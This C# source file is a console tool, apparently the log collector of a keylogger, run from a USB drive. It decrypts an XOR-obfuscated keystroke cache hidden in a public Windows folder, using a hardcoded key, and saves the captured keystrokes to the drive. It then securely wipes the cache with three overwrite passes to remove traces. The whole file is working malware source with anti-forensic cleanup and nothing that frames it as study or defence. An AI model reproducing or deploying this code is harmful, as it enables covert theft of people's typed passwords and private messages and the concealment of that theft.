// ============================================================================
// KeyLogger.Collect — log retrieval tool (Console App, operator-facing)
// .NET Framework 4.7.2
//
// Decrypts cache.dat → USB:\logs\TIMESTAMP_keylog.txt
// Securely wipes source file (3-pass overwrite + delete)
// ============================================================================

using System;
using System.IO;
using System.Text;

namespace KeyLogger.Collect
{
    internal class Program
    {
        private const string XOR_KEY_FALLBACK = "M0ntf0rtR3dT34m!2025";
        private const string CACHE_PATH = @"C:\Users\Public\Libraries\cache.dat";

        private static string _xorKey;

        private static void Main()
        {
            Console.Title = "KeyLogger — Log Collector";
            Console.ForegroundColor = ConsoleColor.Cyan;

            try
            {
                string usbPath = AppDomain.CurrentDomain.BaseDirectory.TrimEnd('\\');
                Console.WriteLine($"[*] Running from: {usbPath}");

                _xorKey = ResolveKey(usbPath);
                Console.WriteLine($"[*] XOR key: {_xorKey}");

                string logDir = Path.Combine(usbPath, "logs");
                Directory.CreateDirectory(logDir);

                if (!File.Exists(CACHE_PATH))
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("[!] No cache.dat found — keylogger may have no data yet.");
                    Pause(); return;
                }

                long size = new FileInfo(CACHE_PATH).Length;
                Console.WriteLine($"[*] cache.dat: {size} bytes");

                byte[] raw = File.ReadAllBytes(CACHE_PATH);
                string text = Encoding.UTF8.GetString(Xor(raw)).TrimEnd('\0', '\uFFFD');

                if (string.IsNullOrWhiteSpace(text))
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("[!] Decrypted content is empty.");
                    Pause(); return;
                }

                string ts = DateTime.Now.ToString("yyyy-MM-dd_HH-mm-ss");
                string outFile = Path.Combine(logDir, $"{ts}_keylog.txt");
                File.WriteAllText(outFile, text, Encoding.UTF8);

                Console.WriteLine($"[+] Decrypted: {text.Length} chars → {outFile}");

                WipeFile(CACHE_PATH);
                Console.WriteLine("[+] cache.dat securely wiped.");

                int lines = text.Split(new[] { "\r\n", "\n" },
                    StringSplitOptions.RemoveEmptyEntries).Length;

                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"\n=== Logs collected ({lines} lines) ===");
                Console.WriteLine("You can now remove the USB drive.");
            }
            catch (UnauthorizedAccessException)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[X] Access denied. Run as Administrator.");
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"[X] {ex.Message}");
            }

            Console.ResetColor();
            Console.WriteLine("\nClosing in 5 seconds...");
            System.Threading.Thread.Sleep(5000);
        }

        private static string ResolveKey(string usbPath)
        {
            string ini = Path.Combine(usbPath, "config.ini");
            if (File.Exists(ini))
            {
                foreach (string line in File.ReadAllLines(ini))
                {
                    string t = line.Trim();
                    if (t.StartsWith("Key=", StringComparison.OrdinalIgnoreCase))
                    {
                        string k = t.Substring(4).Trim();
                        if (!string.IsNullOrEmpty(k)) { Console.WriteLine("[*] Key from config.ini"); return k; }
                    }
                }
            }
            return XOR_KEY_FALLBACK;
        }

        private static byte[] Xor(byte[] data)
        {
            byte[] k = Encoding.UTF8.GetBytes(_xorKey);
            var r = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
                r[i] = (byte)(data[i] ^ k[i % k.Length]);
            return r;
        }

        private static void WipeFile(string path)
        {
            if (!File.Exists(path)) return;
            try
            {
                long len = new FileInfo(path).Length;
                if (len == 0) { File.Delete(path); return; }
                const int BUF = 65536;

                void WritePass(Func<byte[]> gen)
                {
                    using (var fs = new FileStream(path, FileMode.Open, FileAccess.Write,
                        FileShare.None, 4096, FileOptions.WriteThrough))
                    {
                        long left = len;
                        while (left > 0)
                        {
                            byte[] b = gen();
                            int chunk = (int)Math.Min(left, b.Length);
                            fs.Write(b, 0, chunk);
                            left -= chunk;
                        }
                        fs.Flush(true);
                    }
                }

                WritePass(() => new byte[BUF]);
                var rng = new Random();
                WritePass(() => { var b = new byte[BUF]; rng.NextBytes(b); return b; });
                WritePass(() => new byte[BUF]);

                string tmp = Path.Combine(Path.GetDirectoryName(path) ?? ".",
                    Guid.NewGuid().ToString("N") + ".tmp");
                try { File.Move(path, tmp); path = tmp; } catch { }
                File.Delete(path);
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine($"[!] Wipe issue: {ex.Message}");
                try { File.Delete(path); } catch { }
            }
        }

        private static void Pause()
        {
            Console.ResetColor();
            Console.WriteLine("\nPress any key to exit...");
            Console.ReadKey();
        }
    }
}